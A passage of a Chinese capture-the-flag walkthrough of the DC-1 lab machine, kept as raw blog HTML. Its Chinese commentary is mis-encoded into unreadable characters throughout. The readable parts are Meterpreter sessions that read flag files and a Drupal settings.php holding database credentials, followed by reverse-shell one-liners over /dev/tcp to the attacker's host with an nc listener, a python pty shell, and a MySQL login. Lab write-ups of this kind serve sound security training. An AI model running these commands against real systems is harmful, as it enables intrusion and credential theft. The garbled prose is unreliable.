href="#3-æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼Œå¹¶å°è¯•ææƒï¼Œéœ¸ç‰¹ï¼Œç«Ÿç„¶æ²¡æœ‰getsystemğŸ™ƒ" class="headerlink" title="3.æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼Œå¹¶å°è¯•ææƒï¼Œéœ¸ç‰¹ï¼Œç«Ÿç„¶æ²¡æœ‰getsystemğŸ™ƒ"></a>3.æŸ¥çœ‹ç”¨æˆ·æƒé™ï¼Œå¹¶å°è¯•ææƒï¼Œéœ¸ç‰¹ï¼Œç«Ÿç„¶æ²¡æœ‰getsystemğŸ™ƒ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: www-data (33)</span><br><span class="line">meterpreter &gt; getsystem</span><br><span class="line">[-] Unknown <span class="built_in">command</span>: getsystem.</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>ç”±äºè¦æ‰¾åˆ°5ä¸ªflagæ‰€ä»¥è¿˜æ˜¯å…ˆæŸ¥çœ‹ä¸€ä¸‹æ–‡ä»¶</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100644/rw-r--r--  174    fil   2013-11-20 15:45:59 -0500  .gitignore</span><br><span class="line">100644/rw-r--r--  5767   fil   2013-11-20 15:45:59 -0500  .htaccess</span><br><span class="line">100644/rw-r--r--  1481   fil   2013-11-20 15:45:59 -0500  COPYRIGHT.txt</span><br><span class="line">100644/rw-r--r--  1451   fil   2013-11-20 15:45:59 -0500  INSTALL.mysql.txt</span><br><span class="line">100644/rw-r--r--  1874   fil   2013-11-20 15:45:59 -0500  INSTALL.pgsql.txt</span><br><span class="line">100644/rw-r--r--  1298   fil   2013-11-20 15:45:59 -0500  INSTALL.sqlite.txt</span><br><span class="line">100644/rw-r--r--  17861  fil   2013-11-20 15:45:59 -0500  INSTALL.txt</span><br><span class="line">100755/rwxr-xr-x  18092  fil   2013-11-01 06:14:15 -0400  LICENSE.txt</span><br><span class="line">100644/rw-r--r--  8191   fil   2013-11-20 15:45:59 -0500  MAINTAINERS.txt</span><br><span class="line">100644/rw-r--r--  5376   fil   2013-11-20 15:45:59 -0500  README.txt</span><br><span class="line">100644/rw-r--r--  9642   fil   2013-11-20 15:45:59 -0500  UPGRADE.txt</span><br><span class="line">100644/rw-r--r--  6604   fil   2013-11-20 15:45:59 -0500  authorize.php</span><br><span class="line">100644/rw-r--r--  720    fil   2013-11-20 15:45:59 -0500  cron.php</span><br><span class="line">100644/rw-r--r--  52     fil   2019-02-19 08:20:46 -0500  flag1.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  includes</span><br><span class="line">100644/rw-r--r--  529    fil   2013-11-20 15:45:59 -0500  index.php</span><br><span class="line">100644/rw-r--r--  703    fil   2013-11-20 15:45:59 -0500  install.php</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  misc</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  modules</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  profiles</span><br><span class="line">100644/rw-r--r--  1561   fil   2013-11-20 15:45:59 -0500  robots.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  scripts</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  sites</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  themes</span><br><span class="line">100644/rw-r--r--  19941  fil   2013-11-20 15:45:59 -0500  update.php</span><br><span class="line">100644/rw-r--r--  2178   fil   2013-11-20 15:45:59 -0500  web.config</span><br><span class="line">100644/rw-r--r--  417    fil   2013-11-20 15:45:59 -0500  xmlrpc.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><h3 id="4-å‘ç°flag1-txtï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æƒé™çœ‹"><a href="#4-å‘ç°flag1-txtï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æƒé™çœ‹" class="headerlink" title="4.å‘ç°flag1.txtï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æƒé™çœ‹"></a>4.å‘ç°flag1.txtï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰æƒé™çœ‹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>çœ‹æ˜¯èƒ½çœ‹ï¼Œéœ¸ç‰¹ä¸‹ä¸€ä¸ªflagåœ¨å“ªï¼Ÿï¼Ÿï¼Ÿæ ¹æ®æç¤ºï¼Œæ¯ä¸€ä¸ªå¥½çš„cmséœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œä½ ä¹Ÿæ˜¯ã€‚ã€‚ã€‚ğŸ˜¥</code></p><p><code>æŸ¥çœ‹ç½‘ç«™é…ç½®æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªxmlæ–‡ä»¶ï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat web.config</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.webServer&gt;</span><br><span class="line">    &lt;!-- Don<span class="string">&#x27;t show directory listings for URLs which map to a directory. --&gt;</span></span><br><span class="line"><span class="string">    &lt;directoryBrowse enabled=&quot;false&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;rewrite&gt;</span></span><br><span class="line"><span class="string">      &lt;rules&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Protect files and directories from prying eyes&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|^(\..*|Entries.*|Repository|Root|Tag|Template)$&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;CustomResponse&quot; statusCode=&quot;403&quot; subStatusCode=&quot;0&quot; statusReason=&quot;Forbidden&quot; statusDescription=&quot;Access is forbidden.&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Force simple error message for requests for non-existent favicon.ico&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;favicon\.ico&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;CustomResponse&quot; statusCode=&quot;404&quot; subStatusCode=&quot;1&quot; statusReason=&quot;File Not Found&quot; statusDescription=&quot;The requested file favicon.ico was not found&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;conditions&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsFile&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;/conditions&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- Rewrite URLs of the form &#x27;</span>x<span class="string">&#x27; to the form &#x27;</span>index.php?q=x<span class="string">&#x27;. --&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Short URLs&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;^(.*)$&quot; ignoreCase=&quot;false&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;conditions&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsFile&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsDirectory&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;URL&#125;&quot; pattern=&quot;^/favicon.ico$&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;/conditions&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;Rewrite&quot; url=&quot;index.php?q=&#123;R:1&#125;&quot; appendQueryString=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">      &lt;/rules&gt;</span></span><br><span class="line"><span class="string">    &lt;/rewrite&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;httpErrors&gt;</span></span><br><span class="line"><span class="string">      &lt;remove statusCode=&quot;404&quot; subStatusCode=&quot;-1&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;error statusCode=&quot;404&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;/index.php&quot; responseMode=&quot;ExecuteURL&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;/httpErrors&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;defaultDocument&gt;</span></span><br><span class="line"><span class="string">      &lt;!-- Set the default document --&gt;</span></span><br><span class="line"><span class="string">      &lt;files&gt;</span></span><br><span class="line"><span class="string">        &lt;remove value=&quot;index.php&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;add value=&quot;index.php&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;/files&gt;</span></span><br><span class="line"><span class="string">    &lt;/defaultDocument&gt;</span></span><br><span class="line"><span class="string">  &lt;/system.webServer&gt;</span></span><br><span class="line"><span class="string">&lt;/configuration&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt; </span></span><br></pre></td></tr></table></figure><p><code>æ¢ä¸ªæ€è·¯ï¼Œç«Ÿç„¶æ˜¯web applicationé‚£å°±æœ‰æ•°æ®åº“ï¼Œé‚£ä¹ˆæ•°æ®åº“çš„å¯†ç æ˜¯ä»¥æ˜æ–‡çš„æ–¹å¼å†™åœ¨é…ç½®æ–‡ä»¶ä¸­</code></p><p><code>ä¸€ç•ªè‹¦é€¼çš„æŸ¥æ‰¾ï¼Œä»–åœ¨sites/default/settings.phpä¸­</code></p><p><code>å¹¶ä¸”ä¹Ÿçœ‹åˆ°äº†flag2ä¸æç¤ºä¿¡æ¯ï¼Œå†…å®¹ä¸ºï¼šæš´åŠ›ç ´è§£ä¸ç›®å½•æ”»å‡»ä¸æ˜¯ä½ è®¿é—®ç³»ç»Ÿçš„å”¯ä¸€é€”å¾„ï¼Œä½†æ˜¯ä½ å¯ä»¥å°è¯•ä¸€ä¸‹</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren<span class="string">&#x27;t the</span></span><br><span class="line"><span class="string"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="string"> * What can you do with these credentials?</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$databases = array (</span></span><br><span class="line"><span class="string">  &#x27;</span>default<span class="string">&#x27; =&gt; </span></span><br><span class="line"><span class="string">  array (</span></span><br><span class="line"><span class="string">    &#x27;</span>default<span class="string">&#x27; =&gt; </span></span><br><span class="line"><span class="string">    array (</span></span><br><span class="line"><span class="string">      &#x27;</span>database<span class="string">&#x27; =&gt; &#x27;</span>drupaldb<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>username<span class="string">&#x27; =&gt; &#x27;</span>dbuser<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>password<span class="string">&#x27; =&gt; &#x27;</span>R0ck3t<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>host<span class="string">&#x27; =&gt; &#x27;</span>localhost<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>port<span class="string">&#x27; =&gt; &#x27;</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>driver<span class="string">&#x27; =&gt; &#x27;</span>mysql<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>prefix<span class="string">&#x27; =&gt; &#x27;</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    ),</span></span><br><span class="line"><span class="string">  ),</span></span><br><span class="line"><span class="string">);</span></span><br></pre></td></tr></table></figure><h2 id="0x06-ç™»å…¥æ•°æ®åº“"><a href="#0x06-ç™»å…¥æ•°æ®åº“" class="headerlink" title="0x06.ç™»å…¥æ•°æ®åº“"></a>0x06.ç™»å…¥æ•°æ®åº“</h2><p><code>ç”±äºmeterpreterä¸èƒ½è¿›è¡Œmysqlç™»å…¥ï¼Œæ‰€ä»¥è¿›å…¥åˆ°å¸¸è§„shellä¸‹ï¼Œå‘ç°3306æ˜¯å¼€æ”¾çš„ï¼Œå¹¶ä¸”åªå…è®¸æœ¬åœ°è¿æ¥</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3903 created.</span><br><span class="line">Channel 7 created.</span><br><span class="line">netstat -apntu</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:41087           0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 192.168.1.3:52082       192.168.1.6:4444        ESTABLISHED 3837/php        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::36531                :::*                    LISTEN      -               </span><br><span class="line">tcp6       1      0 192.168.1.3:80          192.168.1.6:40931       CLOSE_WAIT  -               </span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:49260           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:783             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 127.0.0.1:815           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:50997           0.0.0.0:*                           -               </span><br><span class="line">udp6       0      0 :::48070                :::*                                -               </span><br><span class="line">udp6       0      0 :::111                  :::*                                -   </span><br><span class="line">udp6       0      0 :::62200                :::*                                -               </span><br><span class="line">udp6       0      0 :::783                  :::*                                -         </span><br></pre></td></tr></table></figure><p><code>å°è¯•ç™»å…¥ï¼Œå‘ç°åœ¨å½“å‰shellä¸‹æ˜¯æ— æ³•ç™»å…¥çš„</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ç”±äºè¿™ä¸ªshellæ˜¯httpæ–¹å¼å»ºç«‹çš„ï¼Œä¸æ˜¯æŒä¹…è¿æ¥ï¼Œæ‰€ä»¥ä¸‹é¢å»ºç«‹æŒä¹…è¿æ¥</code></p><h2 id="0x07-åå¼¹shell"><a href="#0x07-åå¼¹shell" class="headerlink" title="0x07.åå¼¹shell"></a>0x07.åå¼¹shell</h2><p><code>ç”±äºéœ€è¦å»ºç«‹æŒä¹…è¿æ¥ï¼Œæ‰€ä»¥å°è¯•å°†DC1çš„shellåå¼¹ç»™kali</code></p><h3 id="1-kaliå…ˆç›‘å¬6666ç«¯å£"><a href="#1-kaliå…ˆç›‘å¬6666ç«¯å£" class="headerlink" title="1.kaliå…ˆç›‘å¬6666ç«¯å£"></a>1.kaliå…ˆç›‘å¬6666ç«¯å£</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-DC1æ‰§è¡Œ"><a href="#2-DC1æ‰§è¡Œ" class="headerlink" title="2.DC1æ‰§è¡Œ"></a>2.DC1æ‰§è¡Œ</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>å’¦ï¼ŒæŠ¥é”™äº†ğŸ˜±æ¢ä¸ªæ–¹æ³•</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3911 created.</span><br><span class="line">Channel 8 created.</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br><span class="line">/bin/sh: 2: Syntax error: Bad fd numbermeterpreter &gt; </span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>ä¹Ÿä¸è¡Œï¼Œæˆ‘giao</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3915 created.</span><br><span class="line">Channel 10 created.</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1                                                                                                      </span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>å†æ¢ä¸ªæ–¹æ³•ï¼Œæ­¤æ–¹æ³•ä¸ºä½¿ç”¨pythonè„šæœ¬å…ˆå»ºç«‹äº¤äº’shellå†åå¼¹shellç»™kali</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><code>è¿™å›æˆåŠŸäº†ï¼ŒæˆåŠŸå»ºç«‹äº¤äº’å¼shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3924 created.</span><br><span class="line">Channel 12 created.</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-1:/var/www$ /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="3-åå¼¹"><a href="#3-åå¼¹" class="headerlink" title="3.åå¼¹"></a>3.åå¼¹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 51322</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure><p><code>åå¼¹æˆåŠŸå†æ¬¡ç™»å…¥mysql</code></p><h2 id="0x08-å†æ¬¡ç™»å…¥mysql"><a href="#0x08-å†æ¬¡ç™»å…¥mysql" class="headerlink" title="0x08.å†æ¬¡ç™»å…¥mysql"></a>0x08.å†æ¬¡ç™»å…¥mysql</h2><p><code>ç„¶è€Œåœ¨åå¼¹ç»™kaliçš„shellä¸èƒ½ç™»é™†åˆ°mysqlï¼ˆæˆ‘giaoï¼Œè¿™æ˜¯ä»€ä¹ˆåŸç†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼‰</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 51322</span><br><span class="line">www-data@DC-1:/var/www$ mysql -udbuser -pR0ck3t</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ä½†æ˜¯åœ¨ä½¿ç”¨pythonè„šæœ¬è·å¾—çš„äº¤äº’å¼shellä¸‹å´å¯ä»¥ç™»å…¥ï¼Œèœç‹—ä¸€è„¸é—®å·â“â“â“â“â“â“â“â“â“ï¼ˆæˆ‘ç«Ÿç„¶é¥¶äº†ä¸€åœˆã€‚ã€‚ã€‚ï¼‰</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3960 created.</span><br><span class="line">Channel 16 created.</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-1:/var/www$ mysql -udbuser -pR0ck3t</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 16035</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-æŸ¥çœ‹æ•°æ®åº“"><a href="#1-æŸ¥çœ‹æ•°æ®åº“" class="headerlink" title="1.æŸ¥çœ‹æ•°æ®åº“"></a>1.æŸ¥çœ‹æ•°æ®åº“</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><h3 id="2-ä½¿ç”¨drupaldbï¼ŒæŸ¥çœ‹è¡¨"><a href="#2-ä½¿ç”¨drupaldbï¼ŒæŸ¥çœ‹è¡¨" class="headerlink" title="2.ä½¿ç”¨drupaldbï¼ŒæŸ¥çœ‹è¡¨"></a>2.ä½¿ç”¨drupaldbï¼ŒæŸ¥çœ‹è¡¨</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 